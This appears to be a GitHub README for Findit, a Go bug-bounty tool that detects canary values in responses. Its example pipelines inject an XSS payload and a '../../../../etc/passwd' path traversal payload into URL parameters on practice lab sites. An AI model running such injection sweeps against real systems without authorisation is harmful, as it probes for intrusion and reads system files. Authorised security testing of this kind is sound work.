# Findit

Findit is a tool used to parse a canary value from a web request.  
This is useful in bugbounties when you want to find a return value from a list of URL's.  
Think xss, ssti, sqli etc. 


## Install 

```
go install github.com/AssassinUKG/findit@latest
```

## Usage

```
cat URLsFile.txt | findit -c "alert(0)"
```

## Screenshot

![image](https://user-images.githubusercontent.com/5285547/178983196-1aa64236-4541-4d93-9b8f-2465394d88da.png)

---
## Example usages

XSS 

```
echo http://testphp.vulnweb.com/ | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|tff|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | findit -c "alert(0)"
```

/etc/passwd
> Example to find /etc/passwd, on one url 

```
echo "https://0aa9003403a40852c028b1270079009b.web-security-academy.net/image?filename=" | qsreplace "../../../../etc/passwd" | findit -c "root:x"
```


![image](https://user-images.githubusercontent.com/5285547/178974785-cbbab50c-bd6e-4a4e-ae7d-822ba3ca46f6.png)

